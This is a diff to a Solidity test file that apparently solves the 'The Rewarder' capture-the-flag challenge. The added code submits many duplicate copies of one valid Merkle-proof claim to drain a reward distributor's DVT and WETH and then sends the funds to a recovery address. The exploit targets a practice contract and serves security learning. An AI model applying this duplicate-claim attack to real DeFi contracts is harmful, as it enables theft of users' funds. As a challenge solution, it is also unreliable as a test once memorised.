@@ -148,7 +148,44 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
+        // player address: 0x44E97aF4418b7a17AABD8090bEA0A471a366305C
+        // player index: 188
         
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+        uint256 playerDVTAmount = 11524763827831882;
+        uint256 playerWETHAmount = 1171088749244340;
+
+        uint256 numberOfDVTClaims = dvt.balanceOf(address(distributor)) / playerDVTAmount;
+        uint256 numberOfWETHClaims = weth.balanceOf(address(distributor)) / playerWETHAmount;
+
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+        tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
+
+        Claim[] memory claims = new Claim[](numberOfDVTClaims + numberOfWETHClaims);
+
+        for (uint256 i=0; i < numberOfDVTClaims; i++) {
+            claims[i] = Claim({
+                batchNumber: 0, // claim corresponds to first DVT batch
+                amount: playerDVTAmount,
+                tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
+                proof: merkle.getProof(dvtLeaves, 188) // Player's address is at index 188
+            });
+        }
+
+        for (uint256 i=0; i < numberOfWETHClaims; i++) {
+            claims[i + numberOfDVTClaims] = Claim({
+                batchNumber: 0, // claim corresponds to first WETH batch
+                amount: playerWETHAmount,
+                tokenIndex: 1, // claim corresponds to second token in `tokensToClaim` array
+                proof: merkle.getProof(wethLeaves, 188) // Player's address is at index 188
+            });
+        }
+
+        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
+        IERC20(address(dvt)).transfer(recovery, dvt.balanceOf(player));
+        IERC20(address(weth)).transfer(recovery, weth.balanceOf(player));
     }
 
     /**
